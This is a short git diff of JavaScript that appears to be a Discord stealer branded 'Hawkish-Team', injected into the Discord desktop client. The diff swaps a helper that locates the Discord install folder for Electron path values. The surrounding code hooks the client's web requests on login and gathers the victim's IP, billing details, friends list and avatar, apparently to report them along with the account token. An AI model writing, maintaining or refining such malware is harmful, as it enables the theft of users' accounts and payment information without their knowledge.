@@ -150,20 +150,7 @@ const GetA2F = (bouki) => {
     }
 }
 
-async function getDiscordClientFolder() {
-    const parts = __dirname.split('\\');
-    let discordclient;
-  
-    for (let i = parts.length - 1; i >= 0; i--) {
-      const part = parts[i];
-      if (/Discord(PTB|Canary)?/i.test(part) && part !== 'discord_desktop_core') {
-        discordclient = part;
-        break;
-      }
-    }
-  
-    return discordclient || "None";
-  }
+
 
 const parseFriends = friends => {
     var real = friends.filter(x => x.type == 1)
@@ -298,7 +285,11 @@ const FirstTime = async () => {
             console.log(err)
         }
     var ip = await getIP()
-    var client_discord = await getDiscordClientFolder()
+    var {
+        appPath,
+        appName
+    } = path
+    var client_discord = appName
     if (!token) {
         var params = await makeEmbed({
             title: "Hawkish-Team Initialized",
@@ -590,8 +581,11 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
     var Billings = parseBilling(billing)
     var Friends = parseFriends(friends)
-    
-    var client_discord = await getDiscordClientFolder()
+    var {
+        appPath,
+        appName
+    } = path
+    var client_discord = appPath
     
     switch (true) {
         case request.url.endsWith("login"):
